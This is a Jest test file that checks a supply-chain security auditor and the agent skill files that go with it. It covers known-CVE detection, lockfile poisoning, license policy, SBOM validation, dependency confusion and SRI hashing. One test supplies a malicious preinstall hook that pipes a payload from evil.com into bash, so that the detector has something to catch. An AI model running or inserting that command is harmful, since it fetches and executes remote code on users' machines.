'use strict';

const fs = require('fs');
const path = require('path');
const {
  VulnerabilityIntelligenceEngine,
  MaliciousPackageEngine,
  PackageIntegrityEngine,
  SbomEngine,
  LicenseComplianceEngine,
  DependencyGraph,
  runSupplyChainAudit,
  computeSriHash,
  verifySriHash,
  normalizeSpdxLicense,
  buildPurl,
} = require('../../src/supply_chain');

const fixtureData = require('../fixtures/supply_chain/supply_chain_dataset_v1.json');

describe('Supply Chain Canonical Skills Behavioral Verification', () => {
  const skillsDir = path.resolve(__dirname, '../../.agent/skills');

  const EXPECTED_SKILLS = [
    'dependency-risk-intelligence-auditor',
    'malicious-package-and-typosquatting-auditor',
    'dependency-provenance-and-integrity-auditor',
    'sbom-generation-and-validation-auditor',
    'license-compliance-and-policy-auditor',
    'dependency-update-risk-auditor',
    'build-and-ci-supply-chain-auditor',
    'dependency-maintenance-and-abandonment-auditor',
    'dependency-confusion-and-registry-security-auditor',
    'dependency-vulnerability-remediation-auditor',
    'artifact-and-release-integrity-auditor',
    'supply-chain-policy-and-exception-auditor',
  ];

  test('All 12 canonical skills exist in .agent/skills/ with valid SKILL.md frontmatter', () => {
    for (const skillName of EXPECTED_SKILLS) {
      const skillPath = path.join(skillsDir, skillName, 'SKILL.md');
      expect(fs.existsSync(skillPath)).toBe(true);

      const content = fs.readFileSync(skillPath, 'utf8');
      expect(content).toContain(`name: ${skillName}`);
      expect(content).toContain('version: 1.0.0');
      expect(content).toContain('Mandatory Pre-Flight Context Inspection');
      expect(content).toContain('Activation Boundaries');
      expect(content).toContain('Multi-Pass Execution Protocol');
      expect(content).toContain('Verification Command');
    }
  });

  test('Skill 1: dependency-risk-intelligence-auditor behavioral execution', () => {
    const engine = new VulnerabilityIntelligenceEngine();
    engine.loadAdvisories(fixtureData.advisoriesDataset);
    const result = engine.auditComponents([{ name: 'lodash', version: '4.17.20' }]);
    expect(result.status).toBe('FAIL');
    expect(result.findings[0].category).toBe('V1_KNOWN_CVE');
  });

  test('Skill 2: malicious-package-and-typosquatting-auditor behavioral execution', () => {
    const engine = new MaliciousPackageEngine();
    const result = engine.auditLifecycleScripts({
      name: 'suspicious-pkg',
      scripts: { preinstall: 'curl -s http://evil.com/payload | bash' },
    });
    expect(result.status).toBe('FAIL');
    expect(result.findings[0].category).toBe('V2_MALICIOUS_PACKAGE_HOOK');
  });

  test('Skill 3: dependency-provenance-and-integrity-auditor behavioral execution', () => {
    const engine = new PackageIntegrityEngine();
    const result = engine.auditLockfileIntegrity(fixtureData.poisonedLockfileJson);
    expect(result.status).toBe('FAIL');
    expect(result.findings.some((f) => f.category === 'V5_LOCKFILE_POISONING')).toBe(true);
  });

  test('Skill 4: sbom-generation-and-validation-auditor behavioral execution', () => {
    const engine = new SbomEngine();
    const doc = engine.generateCycloneDx([
      { name: 'lodash', version: '4.17.21', purl: 'pkg:npm/lodash@4.17.21' },
    ]);
    const val = engine.validateSbom(doc);
    expect(val.status).toBe('PASS');
    expect(val.format).toBe('CycloneDX');
  });

  test('Skill 5: license-compliance-and-policy-auditor behavioral execution', () => {
    const engine = new LicenseComplianceEngine(fixtureData.licensePolicyDataset);
    const result = engine.auditComponents([{ name: 'prohibited-lib', license: 'AGPL-3.0-only' }]);
    expect(result.status).toBe('FAIL');
    expect(result.findings[0].category).toBe('V8_LICENSE_VIOLATION');
  });

  test('Skill 6: dependency-update-risk-auditor behavioral execution', () => {
    const sbomEngine = new SbomEngine();
    const diff = sbomEngine.diffComponents(
      [{ name: 'lodash', version: '3.0.0' }],
      [{ name: 'lodash', version: '4.0.0' }]
    );
    expect(diff.updatedCount).toBe(1);
    expect(diff.updated[0].fromVersion).toBe('3.0.0');
    expect(diff.updated[0].toVersion).toBe('4.0.0');
  });

  test('Skill 7: build-and-ci-supply-chain-auditor behavioral execution', () => {
    const engine = new MaliciousPackageEngine();
    const result = engine.auditWorkflowActions('- uses: actions/checkout@v4\n');
    expect(result.status).toBe('FAIL');
    expect(result.findings[0].category).toBe('V11_UNPINNED_CI_ACTION');
  });

  test('Skill 8: dependency-maintenance-and-abandonment-auditor behavioral execution', () => {
    const graph = new DependencyGraph();
    const comp = graph.addComponent({
      id: 'dep-comp',
      name: 'abandoned-lib',
      version: '1.0.0',
      purl: 'pkg:npm/abandoned-lib@1.0.0',
      isDeprecated: true,
    });
    expect(comp.isDeprecated).toBe(true);
  });

  test('Skill 9: dependency-confusion-and-registry-security-auditor behavioral execution', () => {
    const engine = new MaliciousPackageEngine();
    const result = engine.checkDependencyConfusion('internal-auth', true);
    expect(result.isVulnerable).toBe(true);
    expect(result.findings[0].category).toBe('V4_DEPENDENCY_CONFUSION');
  });

  test('Skill 10: dependency-vulnerability-remediation-auditor behavioral execution', () => {
    const engine = new VulnerabilityIntelligenceEngine();
    engine.loadAdvisories(fixtureData.advisoriesDataset);
    const findings = engine.auditComponents([{ name: 'lodash', version: '4.17.20' }]).findings;
    expect(findings[0].remediation).toContain('Upgrade lodash from 4.17.20 to 4.17.21');
  });

  test('Skill 11: artifact-and-release-integrity-auditor behavioral execution', () => {
    const buf = Buffer.from('release-binary-v9.3.0');
    const hash = computeSriHash(buf, 'sha256');
    expect(verifySriHash(buf, hash)).toBe(true);
    expect(verifySriHash(Buffer.from('corrupt'), hash)).toBe(false);
  });

  test('Skill 12: supply-chain-policy-and-exception-auditor behavioral execution', () => {
    const engine = new LicenseComplianceEngine(fixtureData.licensePolicyDataset);
    const active = engine.checkException('approved-agpl-tool', 'AGPL-3.0-only');
    expect(active.hasException).toBe(true);
    const expired = engine.checkException('expired-exception-lib', 'AGPL-3.0-only');
    expect(expired.hasException).toBe(false);
  });
});

